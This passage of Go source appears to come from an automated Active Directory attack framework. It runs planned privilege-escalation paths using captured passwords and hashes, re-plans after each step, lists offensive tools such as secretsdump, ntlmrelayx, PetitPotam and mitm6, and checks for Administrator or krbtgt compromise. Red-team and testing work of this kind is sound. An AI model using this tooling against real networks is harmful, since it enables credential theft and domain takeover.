			i+1, len(plan.Steps), step.SourcePrincipal, step.TargetPrincipal, step.AccessRight, cap)

		verdict, err := ExecuteAndReconcile(ctx, step, cap, state, domain, user, pass, hash, targetIP)
		if err != nil {
			fmt.Printf("    ✗ Dispatch failed: %v\n", err)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "dispatch", Key: string(cap),
				Value: fmt.Sprintf("FAIL: %v", err), Confidence: 0.0,
				Timestamp: time.Now(),
			})
			continue
		}

		if !verdict.Trustworthy {
			fmt.Printf("    ✗ Reconciliation failed: %s\n", verdict.Summary)
			for _, m := range verdict.Mismatches {
				fmt.Printf("       mismatch: %s (expected=%s, actual=%s)\n",
					m.Field, m.Expected, m.Actual)
			}
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "reconcile", Key: string(cap),
				Value:      fmt.Sprintf("RECONCILE_FAIL: %s", verdict.Summary),
				Confidence: verdict.Confidence, Timestamp: time.Now(),
			})
			continue
		}

		// Get executor prediction and apply delta
		exec, status := CapabilityRegistry.Resolve(cap)
		if status != core.CapabilityAvailable || exec == nil {
			fmt.Printf("    ✗ No executor for %s\n", cap)
			continue
		}
		predicted := exec.Execute(ctx, step, state)
		changed := core.ApplyDelta(state, predicted.Delta)
		executed++

		fmt.Printf("    ✓ Executed (confidence=%.2f) edges=%d changed=%v\n",
			verdict.Confidence, len(predicted.Delta.NewEdges), changed)

		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: "path_exec", Key: string(cap),
			Value:      fmt.Sprintf("%s→%s (conf=%.2f)", step.SourcePrincipal, step.TargetPrincipal, verdict.Confidence),
			Confidence: verdict.Confidence, Timestamp: time.Now(),
		})

		// Re-plan after mutation to discover new paths
		fmt.Println("    ↻ Re-planning after state mutation...")
		cfg := planner.DefaultConfig()
		cfg.AvailableCaps = getAvailableCaps()
		newPaths := planner.New(state, cfg).PlanPaths(step.SourcePrincipal)
		if len(newPaths) > 0 {
			best := newPaths[0]
			fmt.Printf("    ↻ New path emerges: %s → %s (score=%.1f, %d steps)\n",
				step.SourcePrincipal, best.Target, best.TotalCost, len(best.Steps))
		} else {
			fmt.Println("    ↻ No new paths from this principal after mutation")
		}
	}

	if executed > 0 {
		fmt.Printf("[+] Path execution complete: %d/%d steps successful\n",
			executed, len(plan.Steps))
	}
	return executed
}

// ExecuteBestPaths runs the highest-value planned paths through the
// dispatch → reconcile → ApplyDelta → re-plan loop. Returns the total
// number of path steps executed across all paths.
func ExecuteBestPaths(ctx context.Context, state *core.ADState, plans map[string]planner.ScoredPath, targetIP string, result *core.ToolResult) int {
	if len(plans) == 0 {
		return 0
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for path execution")
		return 0
	}

	total := 0
	for target, plan := range plans {
		n := ExecutePlannedPath(ctx, state, plan, domain, user, pass, hash, targetIP, result)
		total += n
		_ = target
	}
	return total
}

// getAvailableCaps reports which TOOLS are installed on the operator's
// box. The planner's PlannerConfig.AvailableCaps is matched against
// each PrivilegeEdge.Requires (which holds tool names like "nxc",
// "impacket-getST", "bloodyAD"), so this must be a tool-availability
// list, not a list of capability identifiers.
//
// Edges whose Requires don't appear here are penalised by the planner's
// tooling-gap term but never excluded — they remain reachable.
func getAvailableCaps() []string {
	candidates := []string{
		// Network execution & SMB
		"nxc", "netexec", "crackmapexec",
		// AD manipulation
		"bloodyAD", "ldapsearch",
		// Impacket suite
		"impacket-secretsdump", "impacket-GetUserSPNs", "impacket-GetNPUsers",
		"impacket-getTGT", "impacket-getST", "impacket-ticketer",
		"impacket-psexec", "impacket-wmiexec", "impacket-smbexec",
		"impacket-ntlmrelayx",
		// AD CS
		"certipy", "certipy-ad",
		// Shadow credentials
		"pywhisker", "certipy-shadow",
		// Coercion & relay
		"coercer", "PetitPotam.py", "dfscoerce.py",
		"responder", "ntlmrelayx.py",
		// IPv6 attacks
		"mitm6",
		// Tickets
		"krbrelayx.py", "addspn.py",
	}
	var out []string
	for _, t := range candidates {
		if utils.ToolAvailable(t) {
			out = append(out, t)
		}
	}
	return out
}

// printConfidenceHealth logs a summary of edge confidence distribution
// and flags stale / suspect edges for operator awareness.
func printConfidenceHealth(edges []core.PrivilegeEdge) {
	if len(edges) == 0 {
		return
	}
	var high, medium, low, stale, suspect int
	for _, e := range edges {
		if e.Confidence >= 0.8 {
			high++
		} else if e.Confidence >= 0.5 {
			medium++
		} else if e.Confidence >= 0.0 {
			low++
		}
		if e.Stale(time.Hour) && !e.LastVerifiedAt.IsZero() {
			stale++
		}
		if e.ValidationState == core.EdgeStale || e.Confidence < 0.3 {
			suspect++
		}
	}
	fmt.Printf("[*] Edge confidence health: %d total | %d high | %d medium | %d low | %d stale | %d suspect\n",
		len(edges), high, medium, low, stale, suspect)
	if suspect > 0 {
		fmt.Println("    ⚠ Suspect edges detected — planner will deprioritise these paths")
	}
}

func classifyDelta(credsBefore, edgesBefore int, state *core.ADState) DeltaClass {
	if len(state.Creds) > credsBefore {
		return DeltaCredential
	}
	if len(state.Edges) > edgesBefore {
		return DeltaEdge
	}
	return DeltaNoise
}

func hasValidatedDA(state *core.ADState) bool {
	for _, c := range state.Creds {
		if c.Validated && strings.Contains(strings.ToUpper(c.Username), "ADMINISTRATOR") {
			return true
		}
		if c.Validated && strings.Contains(strings.ToUpper(c.Username), "KRBTGT") {
			return true
		}
	}
	return false
}
